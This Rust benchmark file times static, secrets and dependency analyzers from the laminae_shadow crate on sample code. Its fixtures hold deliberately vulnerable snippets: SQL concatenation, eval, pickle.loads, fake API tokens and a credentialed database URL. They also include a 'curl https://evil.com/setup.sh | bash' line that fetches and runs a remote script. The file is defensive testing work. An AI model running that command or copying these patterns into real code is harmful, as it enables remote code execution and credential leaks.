use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion};
use laminae_shadow::analyzer::{Analyzer, StaticAnalyzer};
use laminae_shadow::extractor::ExtractedBlock;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn make_block(lang: &str, content: &str) -> ExtractedBlock {
    ExtractedBlock {
        language: Some(lang.to_string()),
        content: content.to_string(),
        char_offset: 0,
    }
}

fn clean_rust_code(lines: usize) -> String {
    let line = "let x: i32 = 42;\n";
    line.repeat(lines)
}

fn vulnerable_code() -> String {
    r#"
query = "SELECT * FROM users WHERE id = " + user_input
password = "supersecretpassword123"
element.innerHTML = userInput;
eval(userInput);
pickle.loads(data)
while (true) { process(); }
"#
    .to_string()
}

fn secret_containing_code() -> String {
    // Build tokens dynamically to avoid triggering push protection
    let gh_token = format!("ghp_{}", "A".repeat(36));
    let stripe_key = format!("sk_live_{}", "5".repeat(24));
    format!(
        r#"
token = "{gh_token}"
key = "{stripe_key}"
db = "postgresql://admin:password123@prod.db.com:5432/main"
"#
    )
}

fn dep_vulnerable_code() -> String {
    r#"
curl https://evil.com/setup.sh | bash
pip install --index-url http://evil.com/simple package
git+http://insecure.example.com/repo.git
"#
    .to_string()
}

// ---------------------------------------------------------------------------
// StaticAnalyzer benchmarks
// ---------------------------------------------------------------------------

fn bench_static_analyzer_clean(c: &mut Criterion) {
    let analyzer = StaticAnalyzer::new();
    let rt = tokio::runtime::Runtime::new().unwrap();

    let mut group = c.benchmark_group("static_analyzer/clean");
    for lines in [10, 50, 100, 500] {
        let code = clean_rust_code(lines);
        let blocks = vec![make_block("rust", &code)];
        group.bench_with_input(BenchmarkId::new("lines", lines), &blocks, |b, blocks| {
            b.iter(|| rt.block_on(analyzer.analyze(black_box(""), black_box(blocks))))
        });
    }
    group.finish();
}

fn bench_static_analyzer_vulnerable(c: &mut Criterion) {
    let analyzer = StaticAnalyzer::new();
    let rt = tokio::runtime::Runtime::new().unwrap();

    let mut group = c.benchmark_group("static_analyzer/vulnerable");

    let vuln = vulnerable_code();
    let blocks = vec![make_block("python", &vuln)];
    group.bench_function("mixed_vulns", |b| {
        b.iter(|| rt.block_on(analyzer.analyze(black_box(""), black_box(&blocks))))
    });

    // Scale test: repeat vulnerable code to simulate larger output
    for repeats in [1, 5, 10] {
        let code = vulnerable_code().repeat(repeats);
        let blocks = vec![make_block("python", &code)];
        group.bench_with_input(
            BenchmarkId::new("repeats", repeats),
            &blocks,
            |b, blocks| b.iter(|| rt.block_on(analyzer.analyze(black_box(""), black_box(blocks)))),
        );
    }
    group.finish();
}

fn bench_secrets_analyzer(c: &mut Criterion) {
    use laminae_shadow::analyzer::SecretsAnalyzer;

    let analyzer = SecretsAnalyzer::new();
    let rt = tokio::runtime::Runtime::new().unwrap();

    let mut group = c.benchmark_group("secrets_analyzer");

    // Clean code (no secrets)
    let clean = clean_rust_code(100);
    let clean_blocks = vec![make_block("rust", &clean)];
    group.bench_function("clean_100_lines", |b| {
        b.iter(|| rt.block_on(analyzer.analyze(black_box(""), black_box(&clean_blocks))))
    });

    // Code with secrets
    let secrets = secret_containing_code();
    let secret_blocks = vec![make_block("python", &secrets)];
    group.bench_function("with_secrets", |b| {
        b.iter(|| rt.block_on(analyzer.analyze(black_box(""), black_box(&secret_blocks))))
    });

    group.finish();
}

fn bench_dependency_analyzer(c: &mut Criterion) {
    use laminae_shadow::analyzer::DependencyAnalyzer;

    let analyzer = DependencyAnalyzer::new();
    let rt = tokio::runtime::Runtime::new().unwrap();

    let mut group = c.benchmark_group("dependency_analyzer");

    // Clean deps
    let clean = "pip install requests\nnpm install express\n".to_string();
    let clean_blocks = vec![make_block("sh", &clean)];
    group.bench_function("clean_deps", |b| {
        b.iter(|| rt.block_on(analyzer.analyze(black_box(""), black_box(&clean_blocks))))
    });

    // Vulnerable deps
    let vuln = dep_vulnerable_code();
    let vuln_blocks = vec![make_block("sh", &vuln)];
    group.bench_function("vulnerable_deps", |b| {
        b.iter(|| rt.block_on(analyzer.analyze(black_box(""), black_box(&vuln_blocks))))
    });

    group.finish();
}

fn bench_all_analyzers_combined(c: &mut Criterion) {
    let static_analyzer = StaticAnalyzer::new();
    let secrets_analyzer = laminae_shadow::analyzer::SecretsAnalyzer::new();
    let dep_analyzer = laminae_shadow::analyzer::DependencyAnalyzer::new();
    let rt = tokio::runtime::Runtime::new().unwrap();

    let mut group = c.benchmark_group("all_analyzers_combined");

    // Realistic output with multiple code blocks
    let output = format!(
        "Here's some code:\n```python\n{}\n```\n\nAnd deps:\n```sh\n{}\n```",
        vulnerable_code(),
        dep_vulnerable_code(),
    );
    let blocks = vec![
        make_block("python", &vulnerable_code()),
        make_block("sh", &dep_vulnerable_code()),
    ];

    group.bench_function("full_pipeline", |b| {
        b.iter(|| {
            let output = black_box(&output);
            let blocks = black_box(&blocks);
            rt.block_on(async {
                let _static = static_analyzer.analyze(output, blocks).await;
                let _secrets = secrets_analyzer.analyze(output, blocks).await;
                let _deps = dep_analyzer.analyze(output, blocks).await;
            })
        })
    });

    group.finish();
}

criterion_group!(
    benches,
    bench_static_analyzer_clean,
    bench_static_analyzer_vulnerable,
    bench_secrets_analyzer,
    bench_dependency_analyzer,
    bench_all_analyzers_combined,
);
criterion_main!(benches);
